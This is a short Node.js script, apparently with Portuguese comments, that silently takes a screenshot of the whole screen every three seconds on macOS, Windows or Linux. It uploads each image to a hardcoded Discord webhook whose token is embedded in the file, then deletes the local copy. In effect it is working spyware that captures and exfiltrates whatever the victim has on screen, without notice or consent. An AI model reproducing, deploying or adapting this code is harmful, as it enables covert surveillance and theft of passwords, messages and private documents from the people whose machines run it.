const axios = require('axios');
const fs = require('fs');
const path = require('path');
const { execSync } = require('child_process');
const FormData = require('form-data');

const WEBHOOK_URL = "https://discord.com/api/webhooks/1415165637700882535/d88-mMEwfYZt5_542_GMrVRb5gtpM1T6pjSMgGgUWw8VKJ7D7Tr3VmdeQlDaIw6R57Zd";
const INTERVALO = 3000; // 3 seconds in milliseconds

const screenshot = () => {
  // Use platform-specific screenshot command and save to file
  const timestamp = Math.floor(Date.now() / 1000);
  const FILE_PATH = path.join(__dirname, `screenshot_${timestamp}.png`);

  try {
    // macOS
    if (process.platform === 'darwin') {
      execSync(`screencapture -x ${FILE_PATH}`);
    }
    // Windows
    else if (process.platform === 'win32') {
      // Usando PowerShell para capturar screenshot
      const psScript = `
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
$Width = $Screen.Width
$Height = $Screen.Height
$Left = $Screen.Left
$Top = $Screen.Top
$bitmap = New-Object System.Drawing.Bitmap $Width, $Height
$graphic = [System.Drawing.Graphics]::FromImage($bitmap)
$graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
$bitmap.Save('${FILE_PATH}')
`;
      execSync(`powershell -Command "${psScript.replace(/\$/g, '`$')}"`, { shell: 'powershell.exe' });
    } else {
      execSync(`import -window root ${FILE_PATH}`);
    }
  } catch (err) {
    throw new Error('Failed to capture screenshot: ' + err.message);
  }

  return FILE_PATH;
};

const sendScreenshot = async () => {
  while (true) {
    try {
      const FILE_PATH = screenshot();

      const fileStream = fs.createReadStream(FILE_PATH);

      const formData = new FormData();
      formData.append('file', fileStream);
      formData.append('content', '📸 Nova screenshot capturada!');
      formData.append('username', 'Bot Screenshot');
      formData.append('avatar_url', '');

      await axios.post(WEBHOOK_URL, formData, {
        headers: formData.getHeaders(),
      });

      fs.unlinkSync(FILE_PATH);

      await new Promise(resolve => setTimeout(resolve, INTERVALO));
    } catch (e) {
      console.error("[ERRO]", e);
      break;
    }
  }
};

sendScreenshot();